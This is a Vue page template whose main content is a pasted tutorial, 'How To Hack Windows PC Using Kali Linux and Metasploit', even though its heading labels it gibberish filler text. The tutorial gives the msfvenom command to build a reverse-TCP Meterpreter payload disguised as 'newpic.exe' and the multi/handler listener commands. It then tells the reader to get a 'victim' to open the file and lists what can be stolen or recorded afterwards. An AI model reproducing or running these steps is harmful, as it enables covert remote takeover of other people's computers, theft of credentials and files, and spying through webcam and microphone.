<template>
     <main-layout >
          <div class="flex  container lg:px-20 my-20 gap-5 ">
               <div class="w-1/4 flex justify-top flex-col gap-7 sticky top-0">
                    <h1 class="uppercase text-2xl text-center text-black">
                         Random gibberish text to use in web pages, site templates and in typography demos.
                    </h1>
                    <div class="flex justify-center px-5 py-2 gap-4 items-center">
                    <img class=" w-12 h-12 rounded-full border-2 border-transparent ring-1" src="https://picsum.photos/200/300" alt="">
                    <span class="text-gray-400 text-2xl">Fiba Belay</span>
                </div>
                   
                    <div>
                        
                    </div>
               </div>
               <main class=" w-4/5 text-left overflow-hidden">
                     <img src="https://picsum.photos/800" class="rounded-lg" alt="">
                    How To Hack Windows PC Using Kali Linux and Metasploit
Metasploit provides you with lots of exploits and payloads that you can use to hack any windows pc. In this post, i will show you how hackers use kali linux and metasploit to hack windows.
Just like RATs, you can create metasploit payloads and deliver them to your victim. Then you need to start a listener in metasploit to accept incoming connections. When your victim open the the file you will get a connection back and you can perform all short of tasks remotely.
Using this method hackers steal sensitive information like account details, login email and passwords, media files and much more like they can also execute system commands remotely and play with your system on root level. To get more Ethical Hacking tutorials, go to below link
Learn Ethical Hacking
So let’s see how hackers do that.
Step 1- In kali linux, open the terminal and use this command to generate payload.
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.1 lport=4444 -o newpic.exe

In this example, 192.168.43.1 is my and ip address (you need to use your ip address here) and 4444 is the port number that i want to use.
Now you will have a new payload file named newpic.exe (whatever name you used while creating payload) in root folder.
Learn How To Hack Windows Just By Sending An Image
Step 2- You need to deliver this malicious file to your victim.
Step 3- Start the listener to accept incoming connection. Open terminal, type msfconsole and press enter to open the metasploit tool.
There is an exploit in metasploit used to handle reverse connections. We will use that. Enter these commands in terminal one by one to start the listener.
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.43.1
set LPORT 4444
run
It will start listening for incoming connections over port 4444.
Step 4- Everything is up, now wait for your victim to click on your payload file and when your victim click and open the file you will get a session.
And that’s how hackers hack any windows pc. After getting session, you can perform all sort of tasks like uploading and downloading any file from and to victim’s system, screenshot capturing, capturing pictures using webcam, recording voice using mic and much more.
               </main>
          </div>
     </main-layout>
</template>

<script>
    import MainLayout from '../../Layouts/MainLayout.vue';
export default {
     components: {MainLayout}
}
</script>

<style scoped>
body {
     overflow: hidden;
}
</style>